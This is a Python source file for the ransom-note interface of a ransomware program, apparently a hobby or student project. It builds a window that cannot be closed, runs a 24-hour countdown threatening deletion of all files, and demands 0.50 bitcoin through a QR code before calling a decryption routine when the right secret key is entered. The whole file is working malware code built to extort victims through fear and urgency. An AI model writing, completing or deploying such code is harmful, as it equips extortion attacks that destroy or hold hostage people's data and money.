import customtkinter as ctk
from PIL import Image
from decrypt import decryption

def run_ui(files, FILE_KEY, secret_phrase, EXTENSION):

    decrypted_files = []
    # Decryption function
    def on_click():
        global decrypted_files
        if key_entry.get() == secret_phrase:
            print(key_entry.get())
            decrypted_files = decryption(files, FILE_KEY, EXTENSION)
            onClosing()

    def onClosing():
        HEADER = b'encrypted::'
        for file in decrypted_files:
            if file.endswith(EXTENSION):
                with open(file, "rb") as thefile:
                    contents = thefile.read()
                    if contents.startswith(HEADER):
                        return
        root.destroy()    

    def disable_close():
        pass


    def update_time():
        global remaining_time
        remaining_time -= 1
        hours = remaining_time // 3600
        minutes = (remaining_time % 3600) // 60
        seconds = remaining_time % 60
        timer_label.configure(text=f"{hours:02}:{minutes:02}:{seconds:02}")
        if remaining_time > 0:
            root.after(1000, update_time)  # Call this function every 1 second
        else:
            timer_label.configure(text="Too Late, All files are deleted now")

    # Initialize the app
    root = ctk.CTk()
    root.geometry("800x530")
    root.title("Ransomware")

    root.protocol("WM_DELETE_WINDOW", disable_close)

    #font family, size, weight=bold/normal, slant=italic/roman
    title_font = ctk.CTkFont(family="Courier New", size=45, weight="bold", underline=True, overstrike=False)

    frame = ctk.CTkFrame(root, width=800, height=200)
    frame.grid(row=0, column=0, columnspan=4)

    frameL = ctk.CTkFrame(frame, width=400, height=200)
    frameL.grid(row=0, column=0)

    label = ctk.CTkLabel(frameL, text="Ransomeware", font=title_font, text_color="dark red")
    label.grid(row=0, column=0, pady=10)

    info = "If you access this page your computer has been encrypted. Enter the appeared personal key in the field below. If succeed, you'll be provided with a bitcoin account to transfer payment. The current price is on the right.Once we receive your payment you'll get 4 password to decrypt your data. To verify your payment and check the given passwords enter your assigned bitcoin address or your personal key."
    infoLbl = ctk.CTkLabel(frameL, text=info, font=("Courier New", 18), wraplength=430, text_color="red")
    infoLbl.grid(row=1, column=0, padx=20, pady=10)

    frameR = ctk.CTkFrame(frame, width=200, height=200)
    frameR.grid(row=0, column=1)

    label = ctk.CTkLabel(frameR, text="Time left before all files gets deleted", font=("courier New", 20), wraplength=350)
    label.grid(row=0, column=0, padx=25, pady=25)

    timer_label = ctk.CTkLabel(frameR, text="24:00:00", font=("courier New", 65), text_color="dark red")
    timer_label.grid(row=1, column=0, padx=10, pady=10)

    # Initialize remaining_time and start the timer
    global remaining_time 
    remaining_time = 24 * 3600  # 24 hours in seconds
    update_time()

    label = ctk.CTkLabel(frameR, text="Price for decryption:", font=("Courier New", 18), text_color="red")
    label.grid(row=2, column=0, padx=20, pady=10)

    
    img = ctk.CTkImage(dark_image=Image.open("Ransomware_code\BitCoin.png"), size=(30, 30))
    ctk.CTkLabel(frameR, image=img, text="\t = 0.50", font=("Courier New", 18)).grid(row=3, column=0, padx=20, pady=19)

    # Add widgets
    ctk.CTkLabel(root, text="Enter the received secret key", font=("Courier New", 13), text_color="red").grid(row=1, column=0, padx=10)
    key_entry = ctk.CTkEntry(root, width=300, height=50, show="*", placeholder_text="Enter the secret key")
    key_entry.grid(row=1, column=1, pady=10)
    ctk.CTkButton(root, text=" ✔️", command=on_click, fg_color="dark red",width=5, height=40).grid(row=1, column=2)


    ctk.CTkLabel(root, text="To receive the secret key send the specified amount on this QR:", wraplength=350, font=("Courier New", 13), text_color="red").grid(row=2, column=0, padx=10, columnspan=2)
    qrCode = ctk.CTkImage(dark_image=Image.open("Ransomware_code\qrCode.png"), size=(150, 150))
    ctk.CTkLabel(root, image=qrCode, text="", font=("Courier New", 19)).grid(row=2, column=2, padx=10)
    
    # Start the app
    root.mainloop()

